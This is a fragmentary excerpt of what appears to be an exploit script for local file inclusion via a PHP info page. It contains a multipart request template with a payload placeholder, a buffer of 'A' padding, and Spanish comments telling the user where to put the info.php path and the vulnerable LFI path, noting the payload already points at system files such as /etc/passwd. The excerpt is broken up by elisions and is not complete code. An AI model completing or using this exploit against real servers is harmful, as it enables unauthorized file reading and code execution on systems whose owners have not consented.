...
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    ...
    padding = "A" * 5000
    #AQUI INDICAR LA RUTA DEL info.php, según sea el caso donde se acontesca 
...
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    #AÑADIR LA RUTA DONDE OCURRE EL LFI (SIN EL //etc//passwd YA QUE EL PAYLOAD YA ESTA CARGADO "%s")
